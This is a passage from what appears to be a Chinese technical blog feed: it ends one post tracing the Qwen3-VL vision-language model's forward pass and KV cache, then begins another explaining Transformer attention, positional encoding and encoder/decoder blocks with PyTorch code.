            embed_joint[video_mask_joint, :] = vid_embed
            deepstack_visual_embeds.append(embed_joint)
    elif image_mask is not None:
        image_mask = image_mask[..., 0]
        visual_pos_masks = image_mask
        deepstack_visual_embeds = deepstack_image_embeds
    elif video_mask is not None:
        video_mask = video_mask[..., 0]
        visual_pos_masks = video_mask
        deepstack_visual_embeds = deepstack_video_embeds

    if position_ids is None:
        attention_mask_tensor = (
            attention_mask if not isinstance(attention_mask, dict) else attention_mask["full_attention"]
        )
        if attention_mask_tensor is not None and attention_mask_tensor.ndim == 4:
            attention_mask_tensor = torch.diagonal(attention_mask_tensor[:, 0], dim1=1, dim2=2)
            # Only apply conversion for floating point tensors (inverted masks)
            if attention_mask_tensor.dtype.is_floating_point:
                attention_mask_tensor = attention_mask_tensor / torch.finfo(attention_mask_tensor.dtype).min
                attention_mask_tensor = (1.0 - attention_mask_tensor).int()

        # Calculate RoPE index once per generation in the pre-fill stage only.
        # When compiling, we can't check tensor values thus we check only input length
        # It is safe to assume that `length!=1` means we're in pre-fill because compiled
        # models currently cannot do asssisted decoding
        prefill_compiled_stage = is_torchdynamo_compiling() and (
            (input_ids is not None and input_ids.shape[1] != 1)
            or (inputs_embeds is not None and inputs_embeds.shape[1] != 1)
        )
        prefill_noncompiled_stage = not is_torchdynamo_compiling() and (
            (cache_position is not None and cache_position[0] == 0)
            or (past_key_values is None or past_key_values.get_seq_length() == 0)
        )
        if (prefill_compiled_stage or prefill_noncompiled_stage) or self.rope_deltas is None:
            position_ids, rope_deltas = self.get_rope_index(
                input_ids,
                image_grid_thw,
                video_grid_thw,
                attention_mask=attention_mask_tensor,
            )
            self.rope_deltas = rope_deltas
        # then use the prev pre-calculated rope-deltas to get the correct position ids
        else:
            batch_size, seq_length, _ = inputs_embeds.shape
            delta = (
                (cache_position[0] + self.rope_deltas).to(inputs_embeds.device)
                if cache_position is not None
                else 0
            )
            position_ids = torch.arange(seq_length, device=inputs_embeds.device)
            position_ids = position_ids.view(1, -1).expand(batch_size, -1)
            if cache_position is not None:  # otherwise `deltas` is an int `0`
                delta = delta.repeat_interleave(batch_size // delta.shape[0], dim=0)
            position_ids = position_ids.add(delta)
            position_ids = position_ids.unsqueeze(0).expand(3, -1, -1)

    outputs = self.language_model(
        input_ids=None,
        position_ids=position_ids,
        attention_mask=attention_mask,
        past_key_values=past_key_values,
        inputs_embeds=inputs_embeds,
        cache_position=cache_position,
        visual_pos_masks=visual_pos_masks,
        deepstack_visual_embeds=deepstack_visual_embeds,
        **kwargs,
    )

    return Qwen3VLModelOutputWithPast(
        last_hidden_state=outputs.last_hidden_state,
        past_key_values=outputs.past_key_values,
        rope_deltas=self.rope_deltas,
    )

   看上面的代码，我们来看看 input_ids 中的主要的几个数据分别做了什么：


input_ids 通过get_input_embeddings获取了input_ids对应的原始inputs_embeds，这一步和我们以前文章中做embedding是一样的。唯一注意的，这里的embedding向量里面包含&lt;|image_pad|&gt;对应的嵌入向量，是占位的，后面要替换为真实的数据。


pixel_values 通过get_image_features获取了图像数据对应的image_embeds，这里对应Qwen3VLVisionModel的推理过程，下面会简单说明一下。


在masked_scatter中，将inputs_embeds中的占位向量替换为image_embeds。


根据输入的inputs_embeds，获取token对应的position_ids，也就是获取位置信息，在前面的文中提到了为什么transformer需要位置信息。


将最终的position_ids，attention_mask，inputs_embeds，past_key_values（此项内容在下文解释）给Qwen3VLTextModel进行推理得到logits序列


然后将logits按采样参数进行采样，得到最终的输出的文字token,然后进行tokenizer解码，得到最终输出的文字。(此部分不在上面所在代码范围内部，但是是大模型的后处理部分的必要逻辑部分。)


   我们从上文已经知道，其模型分为两个部分，下面分别简单介绍这两部分的forward过程，看看我们之前提到的知识点在真实的多模态大模型中是怎么样的存在。


visual 部分简单分析
  本系列文章严格来说是不应该涉及到多模态大模型的，但是现在常见的多模态大模型应用场景已经逐渐扩大，因此这里用视觉多模态大模型为例子，看看视觉多模态大模型和普通的大模型有什么区别，首先visual部分的forward代码如下：
def forward(self, hidden_states: torch.Tensor, grid_thw: torch.Tensor, **kwargs) -> torch.Tensor:
    """
    Args:
        hidden_states (`torch.Tensor` of shape `(seq_len, hidden_size)`):
            The final hidden states of the model.
        grid_thw (`torch.Tensor` of shape `(num_images_or_videos, 3)`):
            The temporal, height and width of feature shape of each image in LLM.

    Returns:
        `torch.Tensor`: hidden_states.
    """
    hidden_states = self.patch_embed(hidden_states)

    pos_embeds = self.fast_pos_embed_interpolate(grid_thw)
    hidden_states = hidden_states + pos_embeds

    rotary_pos_emb = self.rot_pos_emb(grid_thw)

    seq_len, _ = hidden_states.size()
    hidden_states = hidden_states.reshape(seq_len, -1)
    rotary_pos_emb = rotary_pos_emb.reshape(seq_len, -1)
    emb = torch.cat((rotary_pos_emb, rotary_pos_emb), dim=-1)
    position_embeddings = (emb.cos(), emb.sin())

    cu_seqlens = torch.repeat_interleave(grid_thw[:, 1] * grid_thw[:, 2], grid_thw[:, 0]).cumsum(
        dim=0,
        # Select dtype based on the following factors:
        #  - FA2 requires that cu_seqlens_q must have dtype int32
        #  - torch.onnx.export requires that cu_seqlens_q must have same dtype as grid_thw
        # See https://github.com/huggingface/transformers/pull/34852 for more information
        dtype=grid_thw.dtype if torch.jit.is_tracing() else torch.int32,
    )
    cu_seqlens = F.pad(cu_seqlens, (1, 0), value=0)

    deepstack_feature_lists = []
    for layer_num, blk in enumerate(self.blocks):
        hidden_states = blk(
            hidden_states,
            cu_seqlens=cu_seqlens,
            position_embeddings=position_embeddings,
            **kwargs,
        )
        if layer_num in self.deepstack_visual_indexes:
            deepstack_feature = self.deepstack_merger_list[self.deepstack_visual_indexes.index(layer_num)](
                hidden_states
            )
            deepstack_feature_lists.append(deepstack_feature)

    hidden_states = self.merger(hidden_states)

    return hidden_states, deepstack_feature_lists
  由于本文并不是要细节介绍这个模型的结构，因此这里我们只需要知道其输入是：预处理好的图片数据+grid_thw，其输出是：hidden_states+deepstack_feature_lists。其中最重要的就是输出的hidden_states，它含义是图片token的ebedding向量矩阵，在上面已经提到了其作用。




language_model 部分分析
  对于语言模型部分来说，这个部分才是和我们前面训练的模型比较像的，下面我们先来看看其forward过程：
def forward(
    self,
    input_ids: Optional[torch.LongTensor] = None,
    attention_mask: Optional[torch.Tensor] = None,
    position_ids: Optional[torch.LongTensor] = None,
    past_key_values: Optional[Cache] = None,
    inputs_embeds: Optional[torch.FloatTensor] = None,
    use_cache: Optional[bool] = None,
    cache_position: Optional[torch.LongTensor] = None,
    # args for deepstack
    visual_pos_masks: Optional[torch.Tensor] = None,
    deepstack_visual_embeds: Optional[list[torch.Tensor]] = None,
    **kwargs: Unpack[FlashAttentionKwargs],
) -> Union[tuple, BaseModelOutputWithPast]:
    r"""
    visual_pos_masks (`torch.Tensor` of shape `(batch_size, seqlen)`, *optional*):
        The mask of the visual positions.
    deepstack_visual_embeds (`list[torch.Tensor]`, *optional*):
        The deepstack visual embeddings. The shape is (num_layers, visual_seqlen, embed_dim).
        The feature is extracted from the different visual encoder layers, and fed to the decoder
        hidden states. It's from the paper DeepStack(https://arxiv.org/abs/2406.04334).
    """
    if (input_ids is None) ^ (inputs_embeds is not None):
        raise ValueError("You must specify exactly one of input_ids or inputs_embeds")

    # torch.jit.trace() doesn't support cache objects in the output
    if use_cache and past_key_values is None and not torch.jit.is_tracing():
        past_key_values = DynamicCache(config=self.config)

    if inputs_embeds is None:
        inputs_embeds = self.embed_tokens(input_ids)

    if cache_position is None:
        past_seen_tokens = past_key_values.get_seq_length() if past_key_values is not None else 0
        cache_position = torch.arange(
            past_seen_tokens, past_seen_tokens + inputs_embeds.shape[1], device=inputs_embeds.device
        )

    # the hard coded `3` is for temporal, height and width.
    if position_ids is None:
        position_ids = cache_position.view(1, 1, -1).expand(3, inputs_embeds.shape[0], -1)
    elif position_ids.ndim == 2:
        position_ids = position_ids[None, ...].expand(3, position_ids.shape[0], -1)

    if position_ids.ndim == 3 and position_ids.shape[0] == 4:
        text_position_ids = position_ids[0]
        position_ids = position_ids[1:]
    else:
        text_position_ids = position_ids[0]

    attention_mask = create_causal_mask(
        config=self.config,
        input_embeds=inputs_embeds,
        attention_mask=attention_mask,
        cache_position=cache_position,
        past_key_values=past_key_values,
        position_ids=text_position_ids,
    )

    hidden_states = inputs_embeds

    # create position embeddings to be shared across the decoder layers
    position_embeddings = self.rotary_emb(hidden_states, position_ids)

    # decoder layers
    for layer_idx, decoder_layer in enumerate(self.layers):
        layer_outputs = decoder_layer(
            hidden_states,
            attention_mask=attention_mask,
            position_ids=text_position_ids,
            past_key_values=past_key_values,
            cache_position=cache_position,
            position_embeddings=position_embeddings,
            **kwargs,
        )
        hidden_states = layer_outputs

        # add visual features to the hidden states of first several layers
        if deepstack_visual_embeds is not None and layer_idx in range(len(deepstack_visual_embeds)):
            hidden_states = self._deepstack_process(
                hidden_states,
                visual_pos_masks,
                deepstack_visual_embeds[layer_idx],
            )

    hidden_states = self.norm(hidden_states)

    return BaseModelOutputWithPast(
        last_hidden_state=hidden_states,
        past_key_values=past_key_values,
    )
  我们看到了将position_ids，attention_mask，inputs_embeds，past_key_values传入推理过程后，得到了两个重要的内容，一个logits，一个past_key_values，下面重点介绍一下这两个是什么：


logits 输出的是一次推理后，词表大小的一个概率矩阵，然后根据我们的采样相关参数（例如我们常见的：Temperature/Top P/Frequency Penalty等就是在这一阶段生效），选择对应的token_id，然后转换为文字。


past_key_values 保存的是每一层decoder layer的注意力机制里面的K/V内容，也就是我们常见的KV Cache一词的存在的地方。


  最后我们来看看现在常见的KV cache（缓存命中、缓存未命中）到底意味着什么?我们举一个简单直观的例子：我们保存了“你好”的KV cache，那我们再一次推理“你好世界。”，那么我们可以直接使用“你好”的KV cache，不用重复计算前面部分，可以直接计算新的部分，加快推理速度、减少了计算资源使用。




后记

  本文基于Qwen3-VL-2B-Instruct，回顾了之前的一些知识，从这里我们可以看到，当前大模型里面用到的好多知识点，其实都来自于以前的某个地方。
  本系列到此，完结散花。
参考文献


https://github.com/QwenLM/Qwen3-VL







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>深度学习</category>
        <category>NLP</category>
        <category>LLM</category>
        <category>LM</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>NLP</tag>
        <tag>LLM</tag>
        <tag>LM</tag>
        <tag>attention</tag>
        <tag>transformer</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型基础补全计划(七)---Transformer(多头注意力、自注意力、位置编码)及实例与测试</title>
    <url>/2025/11/16/blog_idx_144/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

   本文是这个系列第七篇，它们是：


《大模型基础补全计划(一)—重温一些深度学习相关的数学知识》 https://www.cnblogs.com/Iflyinsky/p/18717317


《大模型基础补全计划(二)—词嵌入(word embedding) 》 https://www.cnblogs.com/Iflyinsky/p/18775451


《大模型基础补全计划(三)—RNN实例与测试》 https://www.cnblogs.com/Iflyinsky/p/18967569


《大模型基础补全计划(四)—LSTM的实例与测试(RNN的改进)》 https://www.cnblogs.com/Iflyinsky/p/19091089


《大模型基础补全计划(五)—seq2seq实例与测试(编码器、解码器架构)》 https://www.cnblogs.com/Iflyinsky/p/19150535


《大模型基础补全计划(六)—带注意力机制的seq2seq实例与测试(Bahdanau Attention)》 https://www.cnblogs.com/Iflyinsky/p/19184558


  本文的核心是介绍transformer模型结构，下面是transformer的网络结构示意图（图来源：见参考文献部分）。

    
        
    
   
  从上面的架构图可以知道，在开始介绍之前，需要提前介绍多头注意力、自注意力、位置编码等前置知识。




点积注意力与自注意力

   首先我们来介绍一种新的注意力评分方式，点积注意力，其计算公式是：$$\text{Attention}(Q, K, V) = \text{Softmax}\left(\frac{Q K^T}{\sqrt{d_k}}\right) V$$。
   回到前面文章中的seq2seq中的注意力机制（一种加法注意力评分方式），其KV来自于encoder的output，Q来自于decoder的隐藏态。这个时候，我们假设一下，如果QKV都是同一种数据，那么每一次Q，都会输出对整个KV（也就是Q本身）的注意力，这种特殊的注意力被称为自注意力。
   下面是点积注意力的代码，当QKV都是同一个输入时，下面的注意力就是自注意力。
class DotProductAttention(nn.Module):  #@save
    """Scaled dot product attention."""
    def __init__(self, dropout):
        super().__init__()
        self.dropout = nn.Dropout(dropout)

    # Shape of queries: (batch_size, no. of queries, d)
    # Shape of keys: (batch_size, no. of key-value pairs, d)
    # Shape of values: (batch_size, no. of key-value pairs, value dimension)
    # Shape of valid_lens: (batch_size,) or (batch_size, no. of queries)
    def forward(self, queries, keys, values, valid_lens=None):
        d = queries.shape[-1]
        # Swap the last two dimensions of keys with keys.transpose(1, 2)
        scores = torch.bmm(queries, keys.transpose(1, 2)) / math.sqrt(d)
        self.attention_weights = masked_softmax(scores, valid_lens)
        return torch.bmm(self.dropout(self.attention_weights), values)




位置编码

   我们知道，我们的序列数据中的每个数据都是在序列中有位置信息的，根据点积注意力的并行计算的实现，我们知道每个序列数据在同一时间进行了运算，没有序列之间的顺序信息。为了让我们的并行计算过程中，让模型感受到序列的顺序信息，因此我们需要在输入数据中含有位置信息，因此有人设计了位置编码。其代码实现如下：
class PositionalEncoding(nn.Module):  #@save
    """Positional encoding."""
    def __init__(self, num_hiddens, dropout, max_len=1000):
        super().__init__()
        self.dropout = nn.Dropout(dropout)
        # Create a long enough P
        self.P = torch.zeros((1, max_len, num_hiddens))
        X = torch.arange(max_len, dtype=torch.float32).reshape(
            -1, 1) / torch.pow(10000, torch.arange(
            0, num_hiddens, 2, dtype=torch.float32) / num_hiddens)
        self.P[:, :, 0::2] = torch.sin(X)
        self.P[:, :, 1::2] = torch.cos(X)

    def forward(self, X):
        X = X + self.P[:, :X.shape[1], :].to(X.device)
        return self.dropout(X)

   当我们的序列数据经过了位置编码后，在进行点积注意力计算时，我们的输入数据有了顺序信息，会让我们的模型学习到序列顺序相关的信息。




多头注意力

   注意力机制已经可以对一个数据进行有侧重的关注。但是我们希望的是，注意力机制可以对数据的多个维度的侧重关注，因为我们的数据有很多的不同维度的属性信息。例如：一句英文，其有语法信息、有语境信息、有单词之间的信息等等。
   基于这里提到的问题，有人提出了多头注意力机制。从上面的介绍来看，很好理解这个机制，就是每个头单独分析数据的属性，这样我们可以同时关注数据的多个维度的属性，提升我们的模型的理解能力。
   其代码实现如下：
class MultiHeadAttention(nn.Module):  #@save
    """Multi-head attention."""
    def __init__(self, num_hiddens, num_heads, dropout, bias=False, **kwargs):
        super().__init__()
        self.num_heads = num_heads
        self.attention = DotProductAttention(dropout)
        self.W_q = nn.LazyLinear(num_hiddens, bias=bias)
        self.W_k = nn.LazyLinear(num_hiddens, bias=bias)
        self.W_v = nn.LazyLinear(num_hiddens, bias=bias)
        self.W_o = nn.LazyLinear(num_hiddens, bias=bias)


    def transpose_qkv(self, X):
        """Transposition for parallel computation of multiple attention heads."""
        # Shape of input X: (batch_size, no. of queries or key-value pairs,
        # num_hiddens). Shape of output X: (batch_size, no. of queries or
        # key-value pairs, num_heads, num_hiddens / num_heads)
        X = X.reshape(X.shape[0], X.shape[1], self.num_heads, -1)
        # Shape of output X: (batch_size, num_heads, no. of queries or key-value
        # pairs, num_hiddens / num_heads)
        X = X.permute(0, 2, 1, 3)
        # Shape of output: (batch_size * num_heads, no. of queries or key-value
        # pairs, num_hiddens / num_heads)
        return X.reshape(-1, X.shape[2], X.shape[3])

    def transpose_output(self, X):
        """Reverse the operation of transpose_qkv."""
        X = X.reshape(-1, self.num_heads, X.shape[1], X.shape[2])
        X = X.permute(0, 2, 1, 3)
        return X.reshape(X.shape[0], X.shape[1], -1)

    def forward(self, queries, keys, values, valid_lens):
        # Shape of queries, keys, or values:
        # (batch_size, no. of queries or key-value pairs, num_hiddens)
        # Shape of valid_lens: (batch_size,) or (batch_size, no. of queries)
        # After transposing, shape of output queries, keys, or values:
        # (batch_size * num_heads, no. of queries or key-value pairs,
        # num_hiddens / num_heads)
        queries = self.transpose_qkv(self.W_q(queries))
        keys = self.transpose_qkv(self.W_k(keys))
        values = self.transpose_qkv(self.W_v(values))

        if valid_lens is not None:
            # On axis 0, copy the first item (scalar or vector) for num_heads
            # times, then copy the next item, and so on
            valid_lens = torch.repeat_interleave(
                valid_lens, repeats=self.num_heads, dim=0)

        # Shape of output: (batch_size * num_heads, no. of queries,
        # num_hiddens / num_heads)
        output = self.attention(queries, keys, values, valid_lens)
        # Shape of output_concat: (batch_size, no. of queries, num_hiddens)
        output_concat = self.transpose_output(output)
        return self.W_o(output_concat)
   上面的代码透露了一个问题，多头注意力并不是简单的创建N个相同的注意力进行运算，而是通过nn.LazyLinear投影后，在num_hiddens维度进行num_heads个数的划分，注意经过nn.LazyLinear后，num_hiddens维度的每一个数据其实都和输入的数据有关联，因此这个时候进行num_heads个数的划分是有效的，因为这个时候每个num_heads的组都携带了输入数据的全部信息。




位置前馈网络

   引入非线性计算，加强网络认知能力。代码如下：
class PositionWiseFFN(nn.Module):  #@save
    """The positionwise feed-forward network."""
    def __init__(self, ffn_num_hiddens, ffn_num_outputs):
        super().__init__()
        self.dense1 = nn.LazyLinear(ffn_num_hiddens)
        self.relu = nn.ReLU()
        self.dense2 = nn.LazyLinear(ffn_num_outputs)

    def forward(self, X):
        return self.dense2(self.relu(self.dense1(X)))




残差连接和层归一化

   这个结构主要将原始输入叠加到一个其他计算（例如注意力）的输出上面，这样可以保证输出不会丢失原始输入信息，这个在网络层数大的情况下有奇效。代码如下：
class AddNorm(nn.Module):  #@save
    """The residual connection followed by layer normalization."""
    def __init__(self, norm_shape, dropout):
        super().__init__()
        self.dropout = nn.Dropout(dropout)
        self.ln = nn.LayerNorm(norm_shape)

    def forward(self, X, Y):
        return self.ln(self.dropout(Y) + X)




Transformer Encoder结构

   下面是transformer-Encoder部分的代码
class TransformerEncoderBlock(nn.Module):  #@save
    """The Transformer encoder block."""
    def __init__(self, num_hiddens, ffn_num_hiddens, num_heads, dropout,
                 use_bias=False):
        super().__init__()
        self.attention = MultiHeadAttention(num_hiddens, num_heads,
                                                dropout, use_bias)
        self.addnorm1 = AddNorm(num_hiddens, dropout)
        self.ffn = PositionWiseFFN(ffn_num_hiddens, num_hiddens)
        self.addnorm2 = AddNorm(num_hiddens, dropout)

    def forward(self, X, valid_lens):
        Y = self.addnorm1(X, self.attention(X, X, X, valid_lens))
        return self.addnorm2(Y, self.ffn(Y))
   从代码中可以知道，其计算过程就是多头注意力、残差连接及层归一化、位置前馈网络、残差连接及层归一化的过程。




Transformer Decoder结构

  下面是transformer-Decoder部分的代码
class TransformerDecoderBlock(nn.Module):
    # The i-th block in the Transformer decoder
    def __init__(self, num_hiddens, ffn_num_hiddens, num_heads, dropout, i):
        super().__init__()
        self.i = i
        self.attention1 = MultiHeadAttention(num_hiddens, num_heads,
                                                 dropout)
        self.addnorm1 = AddNorm(num_hiddens, dropout)
        self.attention2 = MultiHeadAttention(num_hiddens, num_heads,
                                                 dropout)
        self.addnorm2 = AddNorm(num_hiddens, dropout)
        self.ffn = PositionWiseFFN(ffn_num_hiddens, num_hiddens)
        self.addnorm3 = AddNorm(num_hiddens, dropout)

    def forward(self, X, state):
        enc_outputs, enc_valid_lens = state[0], state[1]
        # During training, all the tokens of any output sequence are processed
        # at the same time, so state[2][self.i] is None as initialized. When
        # decoding any output sequence token by token during prediction,
        # state[2][self.i] contains representations of the decoded output at
        # the i-th block up to the current time step
        if state[2][self.i] is None:
            key_values = X
        else:
            key_values = torch.cat((state[2][self.i], X), dim=1)
        state[2][self.i] = key_values
        if self.training:
            batch_size, num_steps, _ = X.shape
            # Shape of dec_valid_lens: (batch_size, num_steps), where every
            # row is [1, 2, ..., num_steps]
            dec_valid_lens = torch.arange(
                1, num_steps + 1, device=X.device).repeat(batch_size, 1)
        else:
            dec_valid_lens = None
        # Self-attention
        X2 = self.attention1(X, key_values, key_values, dec_valid_lens)
        Y = self.addnorm1(X, X2)
        # Encoder-decoder attention. Shape of enc_outputs:
        # (batch_size, num_steps, num_hiddens)
        Y2 = self.attention2(Y, enc_outputs, enc_outputs, enc_valid_lens)
        Z = self.addnorm2(Y, Y2)
        return self.addnorm3(Z, self.ffn(Z)), state
   从代码中可以知道，其计算过程就是多头注意力、残差连接及层归一化、多头注意力、残差连接及层归一化、位置前馈网络、残差连接及层归一化的过程。




基于transformer的类似seq2seq  英文翻译中文  的实例

   关于dataset部分的内容，请参考前面seq2seq相关文章。


完整代码如下
  
import os
import random
import torch
import math
from torch import nn
from torch.nn import functional as F
import numpy as np
import time
import visdom
import collections
import dataset
class Accumulator:
    """在n个变量上累加"""
    def __init__(self, n):
        """Defined in :numref:`sec_softmax_scratch`"""
        self.data = [0.0] * n

    def add(self, *args):
        self.data = [a + float(b) for a, b in zip(self.data, args)]

    def reset(self):
        self.data = [0.0] * len(self.data)

    def __getitem__(self, idx):
        return self.data[idx]
    
class Timer:
    """记录多次运行时间"""
    def __init__(self):
        """Defined in :numref:`subsec_linear_model`"""
        self.times = []
        self.start()

    def start(self):
        """启动计时器"""
        self.tik = time.time()

    def stop(self):
        """停止计时器并将时间记录在列表中"""
        self.times.append(time.time() - self.tik)
        return self.times[-1]

    def avg(self):
        """返回平均时间"""
        return sum(self.times) / len(self.times)

    def sum(self):
        """返回时间总和"""
        return sum(self.times)

    def cumsum(self):
        """返回累计时间"""
        return np.array(self.times).cumsum().tolist()
class Encoder(nn.Module):
    """编码器-解码器架构的基本编码器接口"""
    def __init__(self, **kwargs):
        # 调用父类nn.Module的构造函数，确保正确初始化
        super(Encoder, self).__init__(**kwargs)

    def forward(self, X, *args):
        # 抛出未实现错误，意味着该方法需要在子类中具体实现
        raise NotImplementedError

class Decoder(nn.Module):
    """编码器-解码器架构的基本解码器接口

    Defined in :numref:`sec_encoder-decoder`"""
    def __init__(self, **kwargs):
        # 调用父类nn.Module的构造函数，确保正确初始化
        super(Decoder, self).__init__(**kwargs)

    def init_state(self, enc_outputs, *args):
        # 抛出未实现错误，意味着该方法需要在子类中具体实现
        raise NotImplementedError

    def forward(self, X, state):
        # 抛出未实现错误，意味着该方法需要在子类中具体实现
        raise NotImplementedError

class EncoderDecoder(nn.Module):
    """编码器-解码器架构的基类

    Defined in :numref:`sec_encoder-decoder`"""
    def __init__(self, encoder, decoder, **kwargs):
        # 调用父类nn.Module的构造函数，确保正确初始化
        super(EncoderDecoder, self).__init__(**kwargs)
        # 将传入的编码器实例赋值给类的属性
        self.encoder = encoder
        # 将传入的解码器实例赋值给类的属性
        self.decoder = decoder

    def forward(self, enc_X, dec_X, enc_X_valid_len, *args):
        # 调用编码器的前向传播方法，处理输入的编码器输入数据enc_X
        enc_outputs = self.encoder(enc_X, enc_X_valid_len, *args)
        # 调用解码器的init_state方法，根据编码器的输出初始化解码器的状态
        dec_state = self.decoder.init_state(enc_outputs, enc_X_valid_len)
        # 调用解码器的前向传播方法，处理输入的解码器输入数据dec_X和初始化后的状态
        return self.decoder(dec_X, dec_state)
    

def masked_softmax(X, valid_lens):  #@save
    """Perform softmax operation by masking elements on the last axis."""
    # X: 3D tensor, valid_lens: 1D or 2D tensor
    def _sequence_mask(X, valid_len, value=0):
        maxlen = X.size(1)
        mask = torch.arange((maxlen), dtype=torch.float32,
                            device=X.device)[None, :] &lt; valid_len[:, None]
        X[~mask] = value
        return X

    if valid_lens is None:
        return nn.functional.softmax(X, dim=-1)
    else:
        shape = X.shape
        if valid_lens.dim() == 1:
            valid_lens = torch.repeat_interleave(valid_lens, shape[1])
        else:
            valid_lens = valid_lens.reshape(-1)
        # On the last axis, replace masked elements with a very large negative
        # value, whose exponentiation outputs 0
        X = _sequence_mask(X.reshape(-1, shape[-1]), valid_lens, value=-1e6)
        return nn.functional.softmax(X.reshape(shape), dim=-1)
    
class DotProductAttention(nn.Module):  #@save
    """Scaled dot product attention."""
    def __init__(self, dropout):
        super().__init__()
        self.dropout = nn.Dropout(dropout)

    # Shape of queries: (batch_size, no. of queries, d)
    # Shape of keys: (batch_size, no. of key-value pairs, d)
    # Shape of values: (batch_size, no. of key-value pairs, value dimension)
    # Shape of valid_lens: (batch_size,) or (batch_size, no. of queries)
    def forward(self, queries, keys, values, valid_lens=None):
        d = queries.shape[-1]
        # Swap the last two dimensions of keys with keys.transpose(1, 2)
        scores = torch.bmm(queries, keys.transpose(1, 2)) / math.sqrt(d)
        self.attention_weights = masked_softmax(scores, valid_lens)
        return torch.bmm(self.dropout(self.attention_weights), values)
    

class MultiHeadAttention(nn.Module):  #@save
    """Multi-head attention."""
    def __init__(self, num_hiddens, num_heads, dropout, bias=False, **kwargs):
        super().__init__()
        self.num_heads = num_heads
        self.attention = DotProductAttention(dropout)
        self.W_q = nn.LazyLinear(num_hiddens, bias=bias)
        self.W_k = nn.LazyLinear(num_hiddens, bias=bias)
        self.W_v = nn.LazyLinear(num_hiddens, bias=bias)
        self.W_o = nn.LazyLinear(num_hiddens, bias=bias)


    def transpose_qkv(self, X):
        """Transposition for parallel computation of multiple attention heads."""
        # Shape of input X: (batch_size, no. of queries or key-value pairs,
        # num_hiddens). Shape of output X: (batch_size, no. of queries or
        # key-value pairs, num_heads, num_hiddens / num_heads)
        X = X.reshape(X.shape[0], X.shape[1], self.num_heads, -1)
        # Shape of output X: (batch_size, num_heads, no. of queries or key-value
        # pairs, num_hiddens / num_heads)
        X = X.permute(0, 2, 1, 3)
        # Shape of output: (batch_size * num_heads, no. of queries or key-value
        # pairs, num_hiddens / num_heads)
        return X.reshape(-1, X.shape[2], X.shape[3])

    def transpose_output(self, X):
        """Reverse the operation of transpose_qkv."""
        X = X.reshape(-1, self.num_heads, X.shape[1], X.shape[2])
        X = X.permute(0, 2, 1, 3)
        return X.reshape(X.shape[0], X.shape[1], -1)

    def forward(self, queries, keys, values, valid_lens):
        # Shape of queries, keys, or values:
        # (batch_size, no. of queries or key-value pairs, num_hiddens)
        # Shape of valid_lens: (batch_size,) or (batch_size, no. of queries)
        # After transposing, shape of output queries, keys, or values:
        # (batch_size * num_heads, no. of queries or key-value pairs,
        # num_hiddens / num_heads)
        queries = self.transpose_qkv(self.W_q(queries))
        keys = self.transpose_qkv(self.W_k(keys))
        values = self.transpose_qkv(self.W_v(values))

        if valid_lens is not None:
            # On axis 0, copy the first item (scalar or vector) for num_heads
            # times, then copy the next item, and so on
            valid_lens = torch.repeat_interleave(
                valid_lens, repeats=self.num_heads, dim=0)

        # Shape of output: (batch_size * num_heads, no. of queries,
        # num_hiddens / num_heads)
        output = self.attention(queries, keys, values, valid_lens)
        # Shape of output_concat: (batch_size, no. of queries, num_hiddens)
        output_concat = self.transpose_output(output)
        return self.W_o(output_concat)
    

class PositionWiseFFN(nn.Module):  #@save
    """The positionwise feed-forward network."""
    def __init__(self, ffn_num_hiddens, ffn_num_outputs):
        super().__init__()
        self.dense1 = nn.LazyLinear(ffn_num_hiddens)
        self.relu = nn.ReLU()
        self.dense2 = nn.LazyLinear(ffn_num_outputs)

    def forward(self, X):
        return self.dense2(self.relu(self.dense1(X)))
    

class AddNorm(nn.Module):  #@save
    """The residual connection followed by layer normalization."""
    def __init__(self, norm_shape, dropout):
        super().__init__()
        self.dropout = nn.Dropout(dropout)
        self.ln = nn.LayerNorm(norm_shape)

    def forward(self, X, Y):
        return self.ln(self.dropout(Y) + X)
    

class TransformerEncoderBlock(nn.Module):  #@save
    """The Transformer encoder block."""
    def __init__(self, num_hiddens, ffn_num_hiddens, num_heads, dropout,
                 use_bias=False):
        super().__init__()
        self.attention = MultiHeadAttention(num_hiddens, num_heads,
                                                dropout, use_bias)
        self.addnorm1 = AddNorm(num_hiddens, dropout)
        self.ffn = PositionWiseFFN(ffn_num_hiddens, num_hiddens)
        self.addnorm2 = AddNorm(num_hiddens, dropout)

    def forward(self, X, valid_lens):
        Y = self.addnorm1(X, self.attention(X, X, X, valid_lens))
        return self.addnorm2(Y, self.ffn(Y))
    
class PositionalEncoding(nn.Module):  #@save
    """Positional encoding."""
    def __init__(self, num_hiddens, dropout, max_len=1000):
        super().__init__()
        self.dropout = nn.Dropout(dropout)
        # Create a long enough P
        self.P = torch.zeros((1, max_len, num_hiddens))
        X = torch.arange(max_len, dtype=torch.float32).reshape(
            -1, 1) / torch.pow(10000, torch.arange(
            0, num_hiddens, 2, dtype=torch.float32) / num_hiddens)
        self.P[:, :, 0::2] = torch.sin(X)
        self.P[:, :, 1::2] = torch.cos(X)

    def forward(self, X):
        X = X + self.P[:, :X.shape[1], :].to(X.device)
        return self.dropout(X)



class TransformerEncoder(Encoder):  #@save
    """The Transformer encoder."""
    def __init__(self, vocab_size, num_hiddens, ffn_num_hiddens,
                 num_heads, num_blks, dropout, use_bias=False):
        super().__init__()
        self.num_hiddens = num_hiddens
        self.embedding = nn.Embedding(vocab_size, num_hiddens)
        self.pos_encoding = PositionalEncoding(num_hiddens, dropout)
        self.blks = nn.Sequential()
        for i in range(num_blks):
            self.blks.add_module("block"+str(i), TransformerEncoderBlock(
                num_hiddens, ffn_num_hiddens, num_heads, dropout, use_bias))

    def forward(self, X, valid_lens):
        # Since positional encoding values are between -1 and 1, the embedding
        # values are multiplied by the square root of the embedding dimension
        # to rescale before they are summed up
        # X[batch_size, seq_len, num_hidden]
        X = self.pos_encoding(self.embedding(X) * math.sqrt(self.num_hiddens))
        self.attention_weights = [None] * len(self.blks)
        for i, blk in enumerate(self.blks):
            X = blk(X, valid_lens)
            self.attention_weights[i] = blk.attention.attention.attention_weights
        # X[batch_size, seq_len, num_hidden]
        return X
    


